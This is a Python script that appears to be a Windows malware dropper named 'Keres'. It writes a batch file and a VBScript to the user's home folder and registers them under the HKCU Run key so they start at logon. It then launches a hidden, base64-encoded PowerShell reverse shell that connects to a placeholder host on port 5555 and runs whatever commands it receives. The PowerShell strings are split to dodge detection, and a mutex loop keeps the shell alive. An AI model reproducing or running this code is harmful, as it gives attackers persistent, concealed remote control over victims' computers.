import subprocess
import base64
import os




# Get the home directory of the current user
home_directory = os.path.expanduser("~")

# Define the path for the batch file in the home directory
batch_file_path = os.path.join(home_directory, 'Keres.bat')

# Define the path for the VBScript file
vbs_script_path = os.path.join(home_directory, 'ExecKeres.vbs')

# Create the VBScript content with the dynamic batch file path
vbs_script_content = f'''
Set objShell = CreateObject("WScript.Shell")


batchFilePath = "{batch_file_path}"


objShell.Run batchFilePath, 0, True
'''





def encode_powershell_command(command):
    # """"""""""""""
    command_bytes = command.encode('utf-16-le')

    #" """"""""""""""""""""""""""""""""
    encoded_command = base64.b64encode(command_bytes).decode('utf-8')

    return encoded_command
#""""""""""""""""""""""""""""""""""""""""""""""""""
ps_command = ''' echo 'hello i am merikh' ; $uniqueIdentifier = "Keres" ;while ($true) { 
        $mutex = New-Object Threading.Mutex($false, $mutexName)
        if ($mutex.WaitOne(0, $false)) {
            try {
                $isRunning = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*$uniqueIdentifier*" };
                if (-not $isRunning) { 
                    Start-Process $PSHOME\powe''rshell.exe -ArgumentList {$uniqueIdentifier;$client = New-Object Sys''tem.N''et.Sock''ets.TCPCl''ient('jjjj',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%0;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName S''ystem.T''ext.AS''CIIE''ncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hid''den 
                } else {
                    Write-Host "Script is already running."
                };  
            } finally {
                $mutex.ReleaseMutex()
            }
        } else {
            Write-Host "Another instance is already running."
        } 
        Start-Sleep -Seconds 10 
    }'''
#stp
encoded_ps_command = encode_powershell_command(ps_command)


# """"""""""""""f'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Merikh /t REG_SZ /d \\C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_ps_command}',
powershell_com =f'''New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Keres" -Value "{batch_file_path}"'''


command=f'''@echo off 
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_ps_command}
'''

    

# """"""""""""""""""
try:
    #subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass","-EncodedCommand", encoded_ps_command], shell=True)
    #subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", powershell_com], shell=True)
    subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       "/v", "Keres", "/t", "REG_SZ", "/d", f"{vbs_script_path}", "/f"], shell=True)
    with open(batch_file_path, 'w') as batch_file:
        batch_file.write(command)
    with open(vbs_script_path, 'w') as vbs_script:
        vbs_script.write(vbs_script_content)

    print(f"VBScript file created at: {vbs_script_path}")
    # Execute the batch file
    subprocess.run(["wscript", vbs_script_path])
       
    print("PowerShell command executed successfully.")
except subprocess.CalledProcessError as e:
    print("Error executing PowerShell command:", e)